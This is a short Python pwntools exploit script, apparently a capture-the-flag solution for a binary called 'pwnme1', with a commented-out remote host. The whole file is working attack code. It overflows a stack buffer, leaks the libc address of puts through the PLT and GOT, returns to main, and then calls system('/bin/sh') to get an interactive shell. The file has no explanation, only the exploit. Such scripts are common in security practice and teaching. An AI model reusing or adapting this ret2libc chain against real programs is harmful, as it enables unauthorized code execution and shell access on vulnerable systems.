from pwn import *
from my_pwn import *
#p=remote("node3.buuoj.cn","25647")
p = process("./pwnme1")

mian = 0x08048624
puts_got = 0x0804A028
puts_plt = 0x08048548
getflg = 0x8048677

#gdb.attach(p)

p.sendlineafter(">> 6. Exit","5")
payload = "a"*0xa4 + "bbbb" + p32(puts_plt) + p32(mian) + p32(puts_got)
p.sendlineafter("fruit:",payload)

p.recvuntil("\n")
puts_addr = u32(p.recv(4))
print hex(puts_addr)
system,binsh = retsystem("puts",puts_addr)

payload = "a"*0xa4 + "bbbb" + p32(system) + p32(binsh) + p32(binsh)

p.sendlineafter("fruit:",payload)

p.interactive()
